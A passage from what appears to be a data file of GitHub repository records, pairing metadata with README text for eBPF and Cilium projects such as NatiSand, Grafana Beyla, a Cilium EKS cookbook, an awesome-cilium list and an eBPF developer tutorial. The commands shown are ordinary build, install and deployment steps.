with larger capacity with rebuilding the ACL rule tables bpf map.

It's a helpful feature to reduce the memory usage of ACL rule buckets when the
ACl rule number is small.

## Other XDP ACL implementations

Before TupleMerge, I've tried other XDP ACL implementations.

- Bitmap based: [XDP ACL](https://github.com/Asphaltt/xdp_acl)
- Iterating based: [iptables like XDP ACL](https://github.com/Asphaltt/iptables-in-bpf)

Bitmap based XDP ACL is learned from

1. [eBPF / XDP based firewall and packet filtering](http://vger.kernel.org/lpc_net2018_talks/ebpf-firewall-paper-LPC.pdf)
2. [Securing Linux with a Faster and Scalable Iptables](https://mbertrone.github.io/documents/21-Securing_Linux_with_a_Faster_and_Scalable_Iptables.pdf)

`iptables` like XDP ACL is iterating all rules one by one. It's not a good idea.

Comparing with them, TupleMerge is a better choice.
"
unibg-seclab/natisand,8,0,8,0,Rust,Native code sandboxing for JavaScript runtimes,2023-07-05T12:51:13Z,2025-06-04T05:23:41Z,6902,"# NatiSand

This repository collects additional material associated with the paper:
[NatiSand: Native Code Sandboxing for JavaScript Runtimes](https://cs.unibg.it/seclab-papers/2023/RAID/natisand.pdf)

## Rationale

Modern runtimes render JavaScript code in a secure and isolated
environment, but when they execute binary programs and shared
libraries, no isolation guarantees are provided. This is an important
limitation, and it affects many popular runtimes including Node.js,
Deno, and Bun.

The paper proposes NatiSand, a component for JavaScript runtimes that
leverages _Landlock_, _eBPF_, and _Seccomp_ to control the filesystem,
Inter-Process Communication (IPC), and network resources available to
binary programs and shared libraries.  NatiSand does not require
changes to the application code and offers to the user an easy
interface.  To demonstrate the effectiveness and efficiency of our
approach we implemented NatiSand and integrated it into Deno, a
modern, security-oriented JavaScript runtime. We also reproduce
vulnerabilities affecting third-party code and show how they can be
mitigated by NatiSand. In the experimental evaluation we analyze the
overhead associated with our approach and compare it with state of the
art code sandboxing solutions.

## Quickstart

1. Initialize all submodules

```bash
git submodule update --init --recursive
 ```
 
2. Clone all submodules

```bash
git pull --recurse-submodules
```

3. Make sure the dependencies required to build V8 are available

4. Build the project

```bash
V8_FROM_SOURCE=1 cargo build --release
```

5. Grant the required file capabilities to the deno executable (the
   required capabilities vary based on the test and the kernel
   version, the following is an example):
   
```bash
sudo setcap cap_dac_override,cap_perfmon,cap_bpf=ep target/release/deno
```

6. Tests
   + Ensure all additional dependencies are installed (e.g., native
     libraries like `sqlite3`, binary programs like `GNU Tar`)
   + Run the tests using `make` or the available Python scripts
"
grafana/ebpf-autoinstrument,1819,154,1819,129,Go,eBPF-based autoinstrumentation of web applications and network metrics,2023-02-20T13:56:47Z,2025-10-12T18:45:42Z,1979,"<img src=""docs/sources/assets/logo.png"" height=226 alt=""Grafana Beyla logo"">

# Grafana Beyla

Open source zero-code automatic instrumentation with eBPF and OpenTelemetry.

[![status badge](https://github.com/grafana/beyla/actions/workflows/publish_dockerhub_release.yml/badge.svg)](https://github.com/grafana/beyla/actions/workflows/publish_dockerhub_release.yml)
[![License](https://img.shields.io/github/license/grafana/beyla)](https://github.com/grafana/beyla/blob/main/LICENSE)

## Important Update for current and future Beyla contributors

Beyla has been [donated](https://github.com/open-telemetry/community/issues/2406) to the CNCF OpenTelemetry Project, under the project name 
[OpenTelemetry eBPF Instrumentation](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation) or **OBI** for short. We are in
the process of vendoring most of the code that exists in the Beyla source repository from upstream. If you are working on a PR, unless it's
related to documentation, please make the PR to the [upstream repository](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation). All Beyla current maintainers work full time on the upstream repository.

We expect that the process of migrating all development to the upstream repository to finish shortly. Some parts of the upstream codebase will
likely be imported as a git submodule.

## Introduction

Beyla is a vendor agnostic, eBPF-based, OpenTelemetry/Prometheus application auto-instrumentation tool, which lets you easily get started with Application Observability. 
eBPF is used to automatically inspect application executables and the OS networking layer, allowing us to capture essential application observability events
for HTTP/S and gRPC services. From these captured eBPF events, we produce OpenTelemetry web transaction trace spans and Rate-Errors-Duration (RED) metrics. 
As with most eBPF tools, all data capture and instrumentation occurs without any modifications to your application code or configuration.

## Community

To engage with the Beyla community and to chat with us on our community Slack channel, 
please invite yourself to the Grafana Slack, visit https://slack.grafana.com/ and join the #beyla channel.

We also run a monthly Beyla community call, on the second Wednesday of the month at **4pm UTC**. You can
find all of the details about our community call on the [Grafana Community Calendar](https://calendar.google.com/calendar/u/0/embed?src=grafana.com_n57lluqpn4h4edroeje6199o00@group.calendar.google.com).

## Getting Started

To try out Beyla, you need to run a network service for Beyla to instrument.
Beyla supports a wide range of programming languages (Go, Java, .NET, NodeJS, Python, Ruby, Rust, etc.),
so if you already have an example service you can use it.
If you don't have an example, you can download and run `example-http-service.go` from the `examples/` directory:

```
curl -OL https://raw.githubusercontent.com/grafana/beyla/main/examples/example-http-service/example-http-service.go
go run ./example-http-service.go
```

Next, generate some traffic. The following command will trigger a GET request to http://localhost:8080 every two seconds.

```
watch curl -s http://localhost:8080
```

Now that we have an example running, we are ready to download and run Beyla.

First, download and unpack the latest release from the [GitHub releases page](https://github.com/grafana/beyla/releases).
The release should contain the `./beyla` executable.

Beyla supports multiple ways to find the service to be instrumented (by network port, executable name, process ID),
and multiple exposition formats (Prometheus, OpenTelemetry metrics, Distributed Traces for Go, Single Span traces for 
other languages).

For getting started, we'll tell Beyla to instrument the service running on port 8080 (our example service) and expose metrics in Prometheus format on port 9400.

```
export BEYLA_PROMETHEUS_PORT=9400
export BEYLA_OPEN_PORT=8080
sudo -E ./beyla
```

Now, you should see metrics on [http://localhost:9400/metrics](http://localhost:9400/metrics).

See [Documentation](https://grafana.com/docs/beyla/) and the [tutorials](https://grafana.com/docs/beyla/latest/tutorial/) for more info.

## Requirements

- Linux with Kernel 5.8 or higher with [BTF](https://www.kernel.org/doc/html/latest/bpf/btf.html)
  enabled, or Linux distributions running RedHat Enterprise Linux 4.18 kernels build 348 and above as they have the required kernel backports. These include CentOS, AlmaLinux, and Oracle Linux. BTF became enabled by default on most Linux distributions with kernel 5.14 or higher.
  You can check if your kernel has BTF enabled by verifying if `/sys/kernel/btf/vmlinux` exists on your system.
  If you need to recompile your kernel to enable BTF, the configuration option `CONFIG_DEBUG_INFO_BTF=y` must be
  set.
- eBPF enabled on the host.
- For instrumenting Go programs, they must have been compiled with at least Go 1.17. We currently
  support Go applications built with a major **Go version no earlier than 3 versions** behind the current
  stable major release.
- Some level of elevated permissions to execute the instrumenter:
    - On host systems, running Beyla requires `sudo`.
    - For Kubernetes we have detailed configuration example on how to run with minimum
      required capabilities in the [examples/k8s/unprivileged.yaml](./examples/k8s/unprivileged.yaml) file.
    - For docker compose, you need to setup Beyla as `privileged` container or grant the `SYS_ADMIN` capability.

| Available Instrumentations                    | Supported  |
|-----------------------------------------------|------------|
| HTTP/HTTPS/HTTP2                              | âœ…         |
| gRPC                                          | âœ…         |
| SQL                                           | âœ…         |
| Redis                                         | âœ…         |
| Kafka                                         | âœ…         |
| MongoDB                                       | âœ…         |

The Go instrumentation is limited to certain specific libraries.

| Available Go Instrumentations                       | Supported  |
|-----------------------------------------------------|------------|
| Standard Go `net/http`                              | âœ…         |
| [Gorilla Mux](https://github.com/gorilla/mux)       | âœ…         |
| [Gin](https://gin-gonic.com/)                       | âœ…         |
| [gRPC-Go](https://github.com/grpc/grpc-go)          | âœ…         |
| [Go x/net/http2](https://golang.org/x/net/http2)    | âœ…         |
| [Go-Redis v9](github.com/redis/go-redis)            | âœ…         |
| [Sarama Kafka](github.com/IBM/sarama)               | âœ…         |
| [kafka-Go](https://github.com/segmentio/kafka-go)   | âœ…         |

HTTPS instrumentation is limited to Go programs and libraries/languages using libssl3.

## Kubernetes

You can just trigger the Kubernetes descriptors in the `deployments/` folder.

1. Provide your Grafana credentials. Use the following [K8s Secret template](deployments/01-grafana-credentials.template.yml)
   to introduce the endpoints, usernames and API keys for Mimir and Tempo:
   ```
   $ cp deployments/01-grafana-credentials.template.yml 01-grafana-credentials.yml
   $ # EDIT the fields
   $ vim 01-grafana-credentials.yml
   $ kubectl apply -f 01-grafana-credentials.yml 
   ```
2. Deploy the Grafana Agent:
   ```
   kubectl apply -f deployments/02-grafana-agent.yml
   ```

3. Deploy a demo app with the auto-instrumenter as a sidecar. You can use the blog example in the
   [deployments/03-instrumented-app.yml](./deployments/03-instrumented-app.yml) file.
   
   ```
   $ kubectl apply -f ./deployments/03-instrumented-app.yml
   $ kubectl port-forward service/goblog 8443:8443
   ```

You should be able to query traces and metrics in your Grafana board.

## Building Beyla from scratch

### Development environment requirements

#### Minimum requirements
- go 1.25
- docker
- GNU make
#### Optional requirements
- llvm >= 19
- clang >= 19

#### Common `Makefile` targets

Beyla's `Makefile` provides several specific-purpose build targets. The most common ones are:
- `prereqs` - install the build pre-requisites
- `docker-generate` - regenerates the eBPF binaries (_preferred method_)
- `generate` - regenerates the eBPF binaries [^1]
- `compile` - compiles the `beyla` binary (but does not automatically regenerates the eBPF binaries)
- `dev` - equivalent to `make prereqs && make docker-generate && make compile`
- `test` - runs unit tests
- `integration-tests` - runs integration tests - may require `sudo`
- `clang-format` - formats C (eBPF) source code[^1]
- `vendor-obi` - Downloads all the Opentelemetry-eBPF-Instrumentation (OBI) dependencies in a submodule, builds the BPF targets, and vendors it.

[^1]: Requires llvm/clang

####  Quickstart

```
$ git clone https://github.com/grafana/beyla.git
$ cd beyla/
$ make dev
```

As described in the previous section, `make dev` takes care of setting up the build pre-requisites, including deploying a `clang-format` pre-commit hook.

After a successful compilation, binaries can be found in the `bin/` subdirectory.

#### Managing code dependencies to opentelemetry-ebpf-instrumentation

Beyla vendors part of the code from the [opentelemetry-ebpf-instrumentation](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation)
(OBI) project.

The code is incorporated as a Git submodule, named `obi-src`, in the `.obi-src` folder in the Beyla code base.
The contents of the `.obi-src` are used to build the BPF dependencies, and in a second step they are vendored
in the `vendor/` directory.

Usually, you just need to run `make vendor-obi` to get the submodule data, compile BPF targets, and vendor them locally.

`.obi-src` folder is pinned to a concrete version of the OBI Git history. If you did changes in the upstream
[opentelemetry-ebpf-instrumentation](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation)
repository, and want to update `.obi-src` to the latest contents, you'll need to run, from Beyla's project folder:

```
git submodule update --checkout --remote 
git add .
```

(`git add .` is really important, otherwise when you try to recompile the code, the `obi-src` submodule might be
reverted to its original status).

#### Developing with a local, development branch of opentelemetry-ebpf-instrumentation

Temporarily go to `go.mod` and change the first `replace` directive by your local OBI folder. For example:

```diff
-replace go.opentelemetry.io/obi => ./.obi-src
+replace go.opentelemetry.io/obi => ../opentelemetry-ebpf-instrumentation
```

Build the docker image with `make dev-image-build`.

âš ï¸ Before pushing your changes to our GitHub repo, don't forget to revert the `replace` directive in `go.mod`! 

#### Formatting and linting code

Beyla uses linters to enforce our coding style and best practices:
- `golangci-lint` for Go code
- `clang-format` for formatting C code
- `clang-tidy` for static analysis of the C code

All of them are enforced on pull requests as part of the Beyla github workflows. Additionally, you can invoke the linters manually:

- `make lint` invokes `golangci-lint` on the Go code
- `make clang-tidy` invokes `clang-tidy` on the C/eBPF code

`clang-format` is invoked automatically as a `pre-commit` git hook, you can run it directly by using the `Makefile` `clang-format` target.

#### Running VM tests

In addition to the `test` and `integration-test` `Makefile` targets, Beyla also runs select tests on QEMU virtual machines in order to be able to test different kernel versions. These tests are also part of our GitHub workflow, but it is also possible to run them manually using the following command:

```
$ sudo make -C test/vm KERNEL_VER=...
```

where `KERNEL_VER` is one of the supported kernel versions located in `test/vm/kernels`. For example, to run tests against kernel version 5.15.152, simply do:

```
$ sudo make -C test/vm KERNEL_VER=5.15.152
```

## Credits

Part of the code is taken from: https://github.com/open-telemetry/opentelemetry-go-instrumentation


"
littlejo/cilium-eks-cookbook,31,1,31,1,HCL,Multiple ways to install cilium in eks,2023-06-08T11:54:53Z,2025-10-12T10:42:45Z,64,"This is a cookbook of installing cilium on eks on different use cases. I tried to simplify a lot the installation. So it's not for production, it's ideal for a POC.

# Easy ways

* [Quickstart to install cilium on eks](install-cilium-eks.md)
* [Quickstart to install cilium on arm eks](install-cilium-eks-arm.md)
* [Quickstart to install a dev version of cilium on eks](install-cilium-eks-dev.md)

# Different ways for the deployment

* [Quickstart to install cilium on eks with Terraform](install-cilium-eks-terraform.md)
* [Quickstart to install cilium on eks with Helm](install-cilium-eks-helm.md)
* [Quickstart to install cilium on eks with ArgoCD](install-cilium-eks-argocd.md)


# Different ways for the networking

* [Quickstart to install cilium on eks using chaining mode](install-cilium-eks-chaining.md)
* [Quickstart to install cilium on eks using overlay mode](install-cilium-eks-overlay.md)
* [Quickstart to install cilium on eks using IPv6](install-cilium-eks-ipv6.md)
* [Quickstart to install cilium on eks using Wireguard](install-cilium-eks-wireguard.md)
* [Quickstart to install cilium on eks using ipsec](install-cilium-eks-ipsec.md)
* [Quickstart to install cilium on eks using eni prefix delegation](install-cilium-eks-prefix.md)
* [Quickstart to install cilium on eks without kube-proxy](install-cilium-eks-kube-proxy-free.md)
* [Quickstart to install cilium on eks using clustermesh](install-cilium-eks-clustermesh.md)

# Different networking add-ons

* [Quickstart to install cilium and api gateway on eks](install-cilium-eks-api-gateway.md)
* [Quickstart to install cilium, prometheus and grafana on eks](install-cilium-eks-prometheus.md)
* [Quickstart to install cilium and hubble on eks](install-cilium-eks-hubble.md)
* [Quickstart to install cilium and use security group with network policy on eks](install-cilium-eks-sg.md)

# Related article

* [(FRENCH) Mon Ã©tÃ© avec Cilium et EKS](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-1-99a66ed6671f)

"
seifrajhi/awesome-cilium,82,9,82,0,,A curated list of awesome projects related to cilium,2023-07-06T09:52:46Z,2025-10-09T08:24:18Z,51,"# Awesome Cilium [![Awesome](https://awesome.re/badge.svg)](https://github.com/sindresorhus/awesome)

> Cilium is an open-source networking project that provides networking and security capabilities for containerized applications, microservices, and virtual machines.

Recently [Cilium](https://docs.cilium.io/en/stable) launched a great website about eBPF called [ebpf.io](https://ebpf.io/). It serves a similar purpose to this list, with [an introduction to eBPF](https://ebpf.io/what-is-ebpf).

## Contents

- [Reference Documentation](#reference-documentation)
- [Cilium related projects](#cilium-related-projects)
- [Articles and Presentations](#articles-and-presentations)
- [Community Events](#community-events)
- [Community and Contributing](#community-and-contributing)
- [Hands on Contents](#hands-on-contents)

## Reference Documentation

- [Website](https://cilium.io) - Official website of Cilium, originally created by [Isovalent](https://isovalent.com/).
- [Official GitHub repository](https://github.com/cilium) - GitHub repository of the Cilium project.
- [A cookbook of installing Cilium on AWS EKS](https://github.com/littlejo/cilium-eks-cookbook) - Multiple ways to install Cilium in EKS.
- [Cilium Certified Associate Study Guide](https://github.com/isovalent/CCA-Study-Guide) - Study guide to help the Cilium community prepare for the CNCF's Cilium Certified Associate (CCA) Exam.

## Cilium related projects

- [Cilium](https://github.com/cilium/cilium) - A networking plugin for various container runtimes such as Kubernetes, Docker, and Mesos. It leverages Linux kernel features like eBPF to provide fast and secure networking and load balancing for applications.
- [eBPF](https://github.com/cilium/ebpf) - Technology that allows for dynamic, programmable packet filtering and network analysis in the Linux kernel.
- [Cilium Proxy](https://github.com/cilium/proxy) - High-performance HTTP, TCP, and gRPC proxy that can be automatically injected into Kubernetes pods. It provides features like load balancing, health checking, and L7 visibility.
- [Cilium Cluster Mesh](https://docs.cilium.io/en/v1.9/gettingstarted/clustermesh/) - Securely connects multiple Kubernetes clusters together using encrypted tunnels. It enables seamless communication and service discovery across clusters while maintaining strong security boundaries.
- [Hubble](https://github.com/cilium/hubble) - Network visibility and monitoring tool built by the Cilium community. It provides real-time visibility into network traffic, allowing operators to gain insights into application behavior, troubleshoot connectivity issues, and enforce network security policies.
- [Cilium Operator](https://docs.cilium.io/en/stable/internals/cilium_operator/) - Kubernetes operator that simplifies the deployment and management of Cilium within a Kubernetes cluster. It automates tasks such as deploying Cilium agents, configuring eBPF policies, and handling upgrades.
- [Tetragon](https://github.com/cilium/tetragon) - Runtime security enforcement and observability tool.
- [Cilium Mesh](https://isovalent.com/blog/post/introducing-cilium-mesh/) - Connects Kubernetes workloads, virtual machines, and physical servers running in the cloud, on-premises, or at the edge.
- [NetworkPolicy Editor](https://editor.networkpolicy.io/) - Create, visualize, and share Kubernetes network policies.
- [Prometheus & Grafana for Cilium](https://github.com/cilium/cilium/tree/main/examples/kubernetes/addons/prometheus) - Collects metrics from Cilium and stores them in Prometheus for analysis and alerting.
- [Cilium Helm Chart](https://artifacthub.io/packages/helm/cilium/cilium) - Helm chart that can be used to deploy Cilium on Kubernetes.
- [Hubble adaptor for OpenTelemetry](https://github.com/cilium/hubble-otel) - Enables exporting Hubble flow data using OpenTelemetry collector.
- [Packet, where are you?](https://github.com/cilium/pwru) - eBPF-based Linux kernel networking debugger.
- [Coroot](https://github.com/coroot/coroot) - Turns telemetry data into actionable insights, helping you identify and resolve application issues quickly.
- [Pixie](https://github.com/pixie-io/pixie) - Instant Kubernetes-native application observability.
- [caretta](https://github.com/groundcover-com/caretta) - Instant K8s service dependency map, right to your Grafana.
- [Netreap](https://github.com/cosmonic-labs/netreap) - Cilium controller implementation for Nomad.
- [Gloo Network](https://www.solo.io/products/gloo-network/) - Enables Cilium-CNI powered by eBPF to provide networking, packet filtering, and observability for modern applications.
- [Bpfilter instead of iptables for routing](https://www.admin-magazine.com/Archive/2019/50/Bpfilter-offers-a-new-approach-to-packet-filtering-in-Linux) - Bpfilter offers a new approach to packet filtering in Linux.

![image](https://github.com/seifrajhi/awesome-cilium/assets/26981510/b2236520-ea4c-400d-a5fd-15850a8bf420)

- [Inter-node traffic control](https://docs.cilium.io/en/latest/network/kubernetes/policy/#ciliumclusterwidenetworkpolicy) - Policies that are applicable to the whole cluster (non-namespaced) and provide you with the means to specify nodes as the source and target.
- [BPF and XDP Reference Guide](http://docs.cilium.io/en/latest/bpf/) - Guide from the Cilium project.
- [Why is the kernel community replacing iptables with BPF?](https://cilium.io/blog/2018/04/17/why-is-the-kernel-community-replacing-iptables/) - Blog post by Cilium on the motivations behind eBPF and bpfilter, with examples and links to other projects using eBPF and bpfilter.
- [Bpfilter: Linux firewall with eBPF sauce](https://qmo.fr/docs/talk_20180316_frnog_bpfilter.pdf) - Slides from a talk by Quentin Monnet with a background on eBPF and comparing bpfilter to iptables.
- [Cilium: Networking & Security for Containers with BPF & XDP](http://www.slideshare.net/ThomasGraf5/clium-container-networking-with-bpf-xdp) - Featuring a load balancer use case.
- [Cilium: Networking & Security for Containers with BPF & XDP](http://www.slideshare.net/Docker/cilium-bpf-xdp-for-containers-66969823) - [Video](https://www.youtube.com/watch?v=TnJF7ht3ZYc&list=PLkA60AVN3hh8oPas3cq2VA9xB7WazcIgs).
- [Cilium: Fast IPv6 container Networking with BPF and XDP](http://www.slideshare.net/ThomasGraf5/cilium-fast-ipv6-container-networking-with-bpf-and-xdp) - Fast IPv6 container networking with BPF and XDP.
- [Cilium: BPF & XDP for containers](https://fosdem.org/2017/schedule/event/cilium/) - BPF & XDP for containers.
- [Learning ebpf book](https://github.com/lizrice/learning-ebpf) - Learning eBPF, published by O'Reilly! Here's where you will find a VM config for the examples.

## Articles and Presentations

- [eBPF log analytics in your Kubernetes cluster](https://www.parseable.io/blog/ebpf-log-analytics) - Leverage Cilium's Tetragon to capture eBPF-based file access logs and send them to Parseable for alerting and further analytics.
- [Introduction to Cilium](https://www.youtube.com/watch?v=80OYrzS1dCA) - A livestream covering all things related to eBPF and Cilium presented by Isovalent's Thomas Graf & Liz Rice.
- [Cilium CNI](https://medium.com/itnext/cilium-cni-a-comprehensive-deep-dive-guide-for-networking-and-security-enthusiasts-588afbf72d5c) - Comprehensive deep dive guide for networking and security enthusiasts.
- [Cilium for Kubernetes networking](https://blog.palark.com/why-cilium-for-kubernetes-networking/) - Why we use it and why we love it.
- [A generic introduction to Cilium](https://opensource.googleblog.com/2016/11/cilium-networking-and-security.html) - Generic introduction to Cilium.
- [A podcast interviewing Thomas Graf](http://blog.ipspace.net/2016/10/fast-linux-packet-forwarding-with.html) - Ivan Pepelnjak interviewing Thomas, October 2016, on eBPF, P4, XDP, and Cilium.
- [How eBPF streamlines the service mesh](https://thenewstack.io/how-ebpf-streamlines-the-service-mesh/) - Explore how eBPF allows us to streamline the service mesh, making the data plane more efficient and easier to deploy.
- [From Amazon VPC CNI to Cilium with zero downtime](https://medium.com/codex/migrate-to-cilium-from-amazon-vpc-cni-with-zero-downtime-493827c6b45e) - Migrate to Cilium from Amazon VPC CNI with zero downtime.
- [Cilium CNI and OKE on Oracle Cloud](https://medium.com/oracledevs/cni-adventures-with-kubernetes-on-oracle-cloud-cilium-5c6f011746d5) - Kubernetes networking with Cilium CNI and OKE on Oracle Cloud.
- [Cilium in Azure Kubernetes Service (AKS)](https://learn.microsoft.com/en-us/azure/aks/azure-cni-powered-by-cilium) - Configure Azure CNI powered by Cilium in Azure Kubernetes Service (AKS).
- [eCHO News NEWSLETTER](https://www.linkedin.com/newsletters/echo-news-6937495018668482560/) - eCHO news in a bi-weekly wrap-up of all things eBPF and Cilium.
- [Exploring eBPF and XDP](https://naftalyava.com/example-xdp-ebpf-code-for-handling-ingress-traffic/) - Basic example of how to get started with XDP.
- [eBPF - Rethinking the Linux Kernel](https://docs.google.com/presentation/d/1AcB4x7JCWET0ysDr0gsX-EIdQSTyBtmi6OAW7bE0jm0/edit#slide=id.g6e43ab8f8d_0_612) - eBPF JavaScript-like capabilities to the Linux Kernel.
- [Learn how Tetragon can stop CVEs with YAML](https://djalal.opendz.org/post/prevent-kernel-overlayfs-ubuntu-cves-with-yaml/) - Prevent overlayfs privilege escalation on Ubuntu kernels with YAML (bpf).
- [Cilium + Istio](https://www.solo.io/blog/cilium-1-14-istio/) - Quick tour of Cilium 1.14 with Istio.
- [Cilium: Decoding the packet path with security groups for pods in EKS](https://medium.com/@amitmavgupta/security-groups-for-pods-in-eks-cilium-and-networking-f809cf72fc31) - Decoding the packet path with security groups for pods in EKS.
- [Cilium mutual auth â€¦ DIY](https://xxradar.medium.com/cilium-mutual-auth-diy-5d5036a82cf9) - Quick run-through on setting up Cilium, mtls on a self-managed Kubernetes cluster.
- [Istio service mesh with ALB in EKS](https://medium.com/@amitmavgupta/installing-cilium-in-azure-kubernetes-service-byocni-with-no-kube-proxy-825b9007b24b) - Install Cilium in a BYOCNI mode seamlessly and leverage eBPF functionality as compared to iptables.
- [Kubernetes LoadBalance service using Cilium BGP control plane](https://medium.com/@valentin.hristev/kubernetes-loadbalance-service-using-cilium-bgp-control-plane-8a5ad416546a) - Walk through the process of creating Cilium-based support for load balancer services in a minimal K3s Kubernetes cluster.
- [eBPF-based networking with Cilium](https://b-nova.com/en/home/content/ebpf-based-networking-with-cilium) - What is it and what can it do?
- [Deploying Red Hat OpenShift with Cilium](https://isovalent.com/blog/post/deploying-red-hat-openshift-with-cilium/) - Tutorial on deploying Cilium and Red Hat OpenShift.
- [Setting up EKS Amazon clusters, adding Cilium to projects using Terraform and Helm, supporting GitOps, and using Karpenter for efficient resource utilization and cost savings](https://aws.plainenglish.io/architecting-for-resilience-crafting-opinionated-eks-clusters-with-karpenter-cilium-cluster-mesh-c87cee1df934) - Architecting for resilience: Crafting opinionated EKS clusters with Karpenter & Cilium Cluster Mesh.
- [Kubernetes Gateway API with Cilium](https://kubito.dev/posts/kubernetes-gateway-api-cilium/) - Guidance on how to effectively configure Cilium for setting up the Gateway API in Kubernetes environments.
- [How to migrate from Red Hat OpenShiftSDN/OVN-Kubernetes to Cilium](https://veducate.co.uk/migrate-red-hat-openshiftsdn-ovn-kubernetes-cilium/) - Step-by-step process of migrating from OpenShiftSDN or OVN-Kubernetes to Cilium.
- [Setup basic L4 load balancing with Cilium CNI and Ubuiqiti Edge Router](https://www.viktorious.nl/2024/01/05/setup-basic-l4-load-balancing-with-cilium-cni-and-ubuiqiti-edge-router/) - Setting up basic L4 load balancing with Cilium CNI and Ubuiqiti Edge Router.

## Community Events

- [CiliumCon](https://cilium.io/events/) - Full-day co-located event for Cilium users, contributors, and new community members.
- [Isovalent Security Summer School 2023](https://isovalent.com/events/2023-07-security-summer-school/) - Virtual Security Summer School with hands-on labs. Learn how Cilium, Tetragon, and Hubble help improve Kubernetes security.
- [Isovalent's cilium related events](https://isovalent.com/events/) - Events featuring diverse voices, innovative companies, and big ideas.

## Community and Contributing

- [Slack channel](https://cilium.herokuapp.com/) - For live conversation and quick questions, join the Cilium Slack workspace.
- [Twitter](https://twitter.com/ciliumproject) - Follow Cilium on Twitter for the latest news and announcements.
- [YouTube](https://www.youtube.com/c/eBPFCiliumCommunity) - Watch videos from the Cilium and eBPF communities.
- [Contributors](https://github.com/cilium/cilium/graphs/contributors) - Contributions to main.

## Hands on Contents

- [Isovalent library for Cilium](https://isovalent.com/resource-library/) - Find videos, case studies, blogs, books, labs, and analyst reports.
- [Cilium Learning Tracks](https://isovalent.com/learning-tracks/) - Tracks for cloud network engineers, security professionals, platform engineers, platform ops (service mesh), and cloud architects.
- [K0S Cilium Playground](https://github.com/xinity/k0s_cilium_playground) - Full bash-based k0s Cilium Clustermesh enabled playground.
- [Podcast: Kubernetes Unpacked Podcast](https://packetpushers.net/podcast/kubernetes-unpacked-022-kubernetes-networking-and-abstraction-with-cilium-and-ebpf/) - Kubernetes Unpacked 022: Kubernetes networking and abstraction with Cilium and eBPF.
- [From Zero to Cluster Mesh: Installing and Configuring Cilium CNI on Kubernetes](https://www.youtube.com/watch?v=z8Kifl3M3LU&list=PLQpKr4_0p0jEIGtCeV4VcGd_-Jf49e1JY) - How to install and configure the Cilium CNI and enable its advanced cluster mesh feature across Kubernetes clusters.
- [Cilium and SPIRE integration](https://github.com/accuknox/cilium-spire-tutorials) - Tutorials about Cilium and SPIRE integration.
- [Cilium Network policies Library](https://github.com/kubearmor/policy-templates/tree/main) - Community curated list of system and network policy templates for KubeArmor and Cilium.
- [Kyverno policies for Cilium Network Policies](https://github.com/adobeSlash/cilium-kyverno) - Examples of Kyverno policies for controlling the creation of Cilium network policies.

## Contributing

> Note: Cilium is an exciting piece of technology, and its ecosystem is constantly evolving. We'd love help from _you_ to keep this awesome list up to date, and improve its signal-to-noise ratio in any way we can. Please feel free to leave [any feedback](https://github.com/seifrajhi/awesome-cilium/issues).

_Please read the [contribution guidelines](CONTRIBUTING.md) before contributing._
"
google/security-research,4221,495,4221,47,C,This project hosts security advisories and their accompanying proof-of-concepts related to research conducted at Google which impact non-Google owned code.,2020-06-15T09:19:51Z,2025-10-12T17:36:59Z,445,"# Security Research

This project hosts security advisories and their accompanying
proof-of-concepts related to research conducted at Google which impact
non-Google owned code.

We believe that vulnerability disclosure is a two-way street. Vendors,
as well as researchers, must act responsibly. This is why Google adheres
to a 90-day disclosure deadline. We notify vendors of vulnerabilities
immediately, with details shared in public with the defensive community
after 90 days, or sooner if the vendor releases a fix.

You can read up on our full policy at:
https://www.google.com/about/appsecurity/.

## Advisories

The disclosure of vulnerabilities are all in the form of security
advisories, which can be browsed in the [Security
Advisories](https://github.com/google/security-research/security/advisories?state=published)
page.

# License & Patents

The advisories and patches posted here are free and open source.

See [LICENSE](https://github.com/google/security-research/blob/master/LICENSE) for
further details.

# Contributing

The easiest way to contribute to our security research projects is to
correct the patches when you see mistakes.

Please read up our
[Contribution](https://github.com/google/security-research/blob/master/CONTRIBUTING.md)
policy.
"
eunomia-bpf/bpf-developer-tutorial,3615,506,3615,28,C,eBPF Developer Tutorial: Learning eBPF Step by Step with Examples,2022-12-02T10:15:45Z,2025-10-12T09:35:09Z,261,"# eBPF Developer Tutorial: Learning eBPF Step by Step with Examples

[![Test example CI](https://github.com/eunomia-bpf/bpf-developer-tutorial/actions/workflows/test-libbpf.yml/badge.svg)](https://github.com/eunomia-bpf/bpf-developer-tutorial/actions/workflows/test-libbpf.yml)
[![Test and trigger downstream tutorial sync](https://github.com/eunomia-bpf/bpf-developer-tutorial/actions/workflows/trigger-sync.yml/badge.svg)](https://github.com/eunomia-bpf/bpf-developer-tutorial/actions/workflows/trigger-sync.yml)

[GitHub](https://github.com/eunomia-bpf/bpf-developer-tutorial)
[Gitee Mirror](https://gitee.com/yunwei37/bpf-developer-tutorial)
[ä¸­æ–‡ç‰ˆ](README.zh.md)

This is a development tutorial for eBPF based on CO-RE (Compile Once, Run Everywhere). It provides practical eBPF development practices from beginner to advanced, including basic concepts, code examples, and real-world applications. Unlike BCC, we use frameworks like `libbpf`, `Cilium`, `libbpf-rs`, and eunomia-bpf for development, with examples in languages such as `C`, `Go`, and `Rust`.

This tutorial **does not cover complex concepts and scenario introductions**. Its main purpose is to provide examples of eBPF tools (**very short, starting with twenty lines of code!**) to help eBPF application developers quickly grasp eBPF development methods and techniques. The tutorial content can be found in the directory, with each directory being an independent eBPF tool example.

The tutorial focuses on eBPF examples in observability, networking, security, and more.

[**ä¸­æ–‡ç‰ˆåœ¨è¿™é‡Œ**](README.zh.md)

## Table of Contents

### Getting Started Examples

This section contains simple eBPF program examples and introductions. It primarily utilizes the `eunomia-bpf` framework to simplify development and introduces the basic usage and development process of eBPF.

- [lesson 0-introduce](src/0-introduce/README.md) Introduction to Core Concepts and Tools
- [lesson 1-helloworld](src/1-helloworld/README.md) Hello World, Framework and Development
- [lesson 2-kprobe-unlink](src/2-kprobe-unlink/README.md) Monitoring unlink System Calls with kprobe
- [lesson 3-fentry-unlink](src/3-fentry-unlink/README.md) Monitoring unlink System Calls with fentry
- [lesson 4-opensnoop](src/4-opensnoop/README.md) Capturing Opening Files and Filter with Global Variables
- [lesson 5-uprobe-bashreadline](src/5-uprobe-bashreadline/README.md) Capturing readline Function Calls with Uprobe
- [lesson 6-sigsnoop](src/6-sigsnoop/README.md) Capturing Signal Sending and Store State with Hash Maps
